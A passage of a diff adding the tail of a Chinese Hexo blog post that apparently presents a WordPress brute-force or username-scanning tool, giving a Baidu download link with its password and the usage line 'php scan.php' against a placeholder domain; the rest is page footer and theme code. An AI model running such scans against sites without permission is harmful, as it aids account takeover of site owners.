+?&gt;</code></pre>
+<h2 id="打包下载"><a href="#打包下载" class="headerlink" title="打包下载"></a>打包下载</h2><p>文章引用来自：<a target="_blank" rel="noopener" href="http://www.uedbox.com/brutewordpress-scan/">体验盒子 | 关注网络安全</a>，请大家支持原创</p>
+<p>链接:<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1jIMQPq2">http://pan.baidu.com/s/1jIMQPq2</a> ，密码：o5q3</p>
+<p>使用方法很简单：下载这个资源，然后在scan.php所在文件夹下运行命令：</p>
+<pre><code>php scan.php http://www.targetdomain.com</code></pre>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wordpress-%E5%AE%89%E5%85%A8-%E7%94%A8%E6%88%B7-%E5%B7%A5%E5%85%B7/" rel="tag"># wordpress,安全,用户,工具</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/11/25/%E5%AE%89%E8%A3%85wordpress%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/" rel="prev" title="安装wordpress网站安全检测工具">
+      <i class="fa fa-chevron-left"></i> 安装wordpress网站安全检测工具
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/11/28/%E9%81%BF%E5%85%8DWordPress%E6%B3%84%E9%9C%B2%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%90%8D%E7%9A%84%E6%96%B9%E6%B3%95/" rel="next" title="避免WordPress泄露管理员用户名的方法">
+      避免WordPress泄露管理员用户名的方法 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.</span> <span class="nav-text">打包下载</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">424</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">400</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
